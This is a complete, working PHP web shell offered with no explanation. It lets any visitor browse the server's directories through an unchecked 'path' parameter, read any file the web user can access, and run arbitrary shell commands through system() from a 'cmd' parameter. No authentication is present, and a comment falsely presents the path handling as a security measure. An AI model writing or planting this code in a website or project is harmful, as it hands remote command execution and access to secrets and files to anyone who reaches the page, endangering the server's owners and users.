<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);

// Handle "cd" manually for security
if (!is_dir($path)) {
    die("Invalid path");
}

echo "<h3>📁 Path: ";
$parts = explode(DIRECTORY_SEPARATOR, $path);
$full = "";
foreach ($parts as $i => $part) {
    if ($part == "") continue;
    $full .= DIRECTORY_SEPARATOR . $part;
    echo "<a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($part) . "</a> / ";
}
echo "</h3>";

// List contents
$files = scandir($path);
echo "<ul style='font-family: monospace'>";
foreach ($files as $file) {
    if ($file === '.') continue;

    $fullPath = $path . DIRECTORY_SEPARATOR . $file;
    $link = "?path=" . urlencode($fullPath);
    
    if (is_dir($fullPath)) {
        echo "<li>📁 <a href='$link'>" . htmlspecialchars($file) . "</a></li>";
    } elseif (is_file($fullPath)) {
        echo "<li>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a></li>";
    }
}
echo "</ul>";

// Show file content if clicked
if (isset($_GET['view'])) {
    $fileToView = $path . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($fileToView)) {
        echo "<h4>📄 Viewing: " . htmlspecialchars($_GET['view']) . "</h4>";
        echo "<pre style='background:#111;color:#0f0;padding:10px;border-radius:8px;'>";
        echo htmlspecialchars(file_get_contents($fileToView));
        echo "</pre>";
    }
}

// Optional: terminal
echo "<hr><form method='GET'>";
echo "<input type='hidden' name='path' value='" . htmlspecialchars($path) . "' />";
echo '<input type="text" name="cmd" placeholder="Shell command" style="width:300px;" />';
echo '<input type="submit" value="Run" />';
echo '</form>';

if (isset($_GET['cmd'])) {
    echo "<pre><b>$ " . htmlspecialchars($_GET['cmd']) . "</b>\n";
    chdir($path);
    system($_GET['cmd']);
    echo "</pre>";
}
?>
